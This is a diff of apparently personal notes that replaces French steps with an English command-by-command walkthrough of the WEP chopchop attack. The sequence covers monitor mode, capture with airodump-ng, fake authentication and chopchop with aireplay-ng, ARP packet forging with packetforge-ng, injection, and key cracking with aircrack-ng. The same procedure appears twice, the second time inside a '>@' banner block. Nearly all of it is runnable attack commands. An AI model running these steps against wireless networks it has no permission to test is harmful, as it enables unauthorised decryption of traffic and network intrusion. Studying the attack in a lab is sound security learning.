@@ -1,46 +1,98 @@
-1- Carte en mode monitor
+Chopchop attack
 
-2- Verification des points d'acces
-sudo airodump-ng wlan0mon
+In 2004, when WEP had already been broken since officially 2001, Korek published the first version 
+of a tool called chopchop which allows you to decrypt any encrypted packet without knowing the WEP 
+key.
 
-3- Demarrage airodump pour ecriture fichier (chopchop)
-$ sudo airodump-ng wlan0mon --channel <ch> -w chopchop 
+1. Put the wireless card in Monitor mode.
 
-4- Lancement de la fausse authentification.
-$ sudo aireplay-ng -1 0 -e <ESSID> -a <MAC BSSID> -h <MAC kali> wlan0mon
->>> authentification aupres du point d'acces.
-$ sudo aireplay-ng --chopchop -b <MAC BSSID> -h <MAC kali> wlan0mon
->>> recherce d'un paquet.
->>> validation avec y (yes) puis attendre la fin. On note le fichier keystream.
+2. Access point verification.
+$ sudo airodump-ng wlan0
+>>> note the BSSID MAC: MAC of the access point.
+>>> note the ESSID:     name of the access point.
 
-5- Forge d'un paquet.
-$ sudo packetforge-ng -0 -a <MAC BSSID> -h <MAC kali> -k 255.255.255.255 -l 255.255.255.255. -y <keystream file .xor> -w paquetchopchop
+3. Packets recording with airodump-ng.
+$ sudo airodump-ng --channel <ch> -w chopchop wlan0
 
-6- Injection du paquet.
-$sudo aireplay-ng -2 -r paquetchopchop walan0mon
->>> répondre y (yes)
+4. Performs a fake authentication.
+Accelerate the number of authentication.
+Use '-1' or '--fakeauth'.
+$ sudo aireplay-ng -1 0 -e <ESSID> -a <BSSID MAC> -h <kali MAC> wlan0
+>>> -1 0 : do the fake just one time.
+>>> authentification to the acces point. The acces point accepts our MAC address and will listen 
+    our packets.
 
-7- Lancement du crack
+5. Attack with chopchop.
+$ sudo aireplay-ng --chopchop -b <BSSID MAC> -h <MAC kali> wlan0
+>>> airreplay-ng searches for an ARP packet then ...
+>>> ... propose "Use this packet ?". Say yed (y) then wait for the end of the operation. 
+>>> note the name of the 'keystream' file. 
+
+6. Forge a packet.
+$ sudo packetforge-ng -0 -a <BSSID MAC> -h <MAC kali> -k 255.255.255.255 -l 255.255.255.255. 
+                      -y <keystream.xor file> -w paquetchopchop
+>>> -0 means create an ARP packet.
+
+7. Packet injection.
+$ sudo aireplay-ng -2 -r paquetchopchop wlan0
+>>> Say y (yes)
+
+8. Stop the airodump-ng recorder (see 3.).
+Use Ctrl-C.
+
+9. Launch the crack on the recorded packet file (see 3.).
 $ sudo aircrack-ng chopchop-01.cap
 
 >@
->@##############################################################
+>@#########################################################################################################
+>@#                                                                                                       #
+>@# [ Chopchop attack ]                                                                                   #
+>@#                                                                                                       #
+>@# In 2004, when WEP had already been broken since officially 2001, Korek published the first version    #
+>@# of a tool called chopchop which allows you to decrypt any encrypted packet without knowing the WEP    #
+>@# key.                                                                                                  #
+>@#                                                                                                       #
+>@#-------------------------------------------------------------------------------------------------------#
 >@
->@* Mode monitor
+>@1. Put the wireless card in Monitor mode.
 >@
->@* Airodump en ecriture 
->@$ sudo airodump-ng wlan0mon --channel <ch> -w chopchop
+>@2. Access point verification.
+>@$ sudo airodump-ng wlan0
+>@>>> note the BSSID MAC: MAC of the access point.
+>@>>> note the ESSID:     name of the access point.
 >@
->@* Traffic
->@$ sudo aireplay-ng -1 0 -e <ESSID> -a <MAC BSSID> -h <MAC kali> wlan0mon
->@$ sudo aireplay-ng --chopchop -b <MAC BSSID> -h <MAC kali> wlan0mon
->@$ sudo packetforge-ng -0 -a <MAC BSSID> -h <MAC kali> -k 255.255.255.255 -l 255.255.255.255. -y <keystream file .xor> -w paquetchopchop
->@$ sudo aireplay-ng -2 -r paquetchopchop walan0mon
+>@3. Packets recording with airodump-ng.
+>@$ sudo airodump-ng --channel <ch> -w chopchop wlan0
 >@
->@* Crack
->@$ sudo aircrack-ng chopchop-01.cap -b <MAC BSSID>
+>@4. Performs a fake authentication.
+>@Accelerate the number of authentication.
+>@Use '-1' or '--fakeauth'.
+>@$ sudo aireplay-ng -1 0 -e <ESSID> -a <BSSID MAC> -h <kali MAC> wlan0
+>@>>> -1 0 : do the fake just one time.
+>@>>> authentification to the acces point. The acces point accepts our MAC address and will listen 
+>@    our packets.
 >@
->@##############################################################
+>@5. Attack with chopchop.
+>@$ sudo aireplay-ng --chopchop -b <BSSID MAC> -h <MAC kali> wlan0
+>@>>> airreplay-ng searches for an ARP packet then ...
+>@>>> ... propose "Use this packet ?". Say yed (y) then wait for the end of the operation. 
+>@>>> note the name of the 'keystream' file. 
 >@
+>@6. Forge a packet.
+>@$ sudo packetforge-ng -0 -a <BSSID MAC> -h <MAC kali> -k 255.255.255.255 -l 255.255.255.255. 
+>@                      -y <keystream.xor file> -w paquetchopchop
+>@>>> -0 means create an ARP packet.
+>@
+>@7. Packet injection.
+>@$ sudo aireplay-ng -2 -r paquetchopchop wlan0
+>@>>> Say y (yes)
+>@
+>@8. Stop the airodump-ng recorder (see 3.).
+>@Use Ctrl-C.
+>@
+>@9. Launch the crack on the recorded packet file (see 3.).
+>@$ sudo aircrack-ng chopchop-01.cap
+>@
+>@#########################################################################################################
 >@
 
